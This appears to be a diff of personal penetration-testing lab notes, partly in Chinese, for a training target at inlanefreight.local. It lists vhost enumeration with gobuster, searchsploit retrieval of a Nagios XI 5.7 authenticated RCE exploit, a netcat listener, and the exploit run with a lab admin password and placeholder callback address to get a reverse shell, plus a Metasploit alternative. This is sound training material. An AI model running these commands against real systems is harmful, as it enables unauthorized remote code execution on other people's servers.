@@ -303,11 +303,22 @@ ELF  /  DLL:
 
 
 Lab:
+  找vhost
+  找应用和版本
+  找硬凭证
+  找CVE
+  ***
   gobuster vhost -u inlanefreight.local -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -k -q            for vhost
 
+  searchsploit nagios 5.7
+
+  searchsploit -m php/webapps/49422.py
   
+  nc -nvlp PWNPO &            & = 后台运行
 
-  
+  python3 49422.py http://monitoring.inlanefreight.local nagiosadmin 'oilaKglm7M09@CPL&^lC' STMIP STMPO &
 
+  fg 9            回到9好job  
+  ***
 
-    
+  Alternatively, students can use the Metasploit module exploit/linux/http/nagios_xi_plugins_filename_authenticated_rce
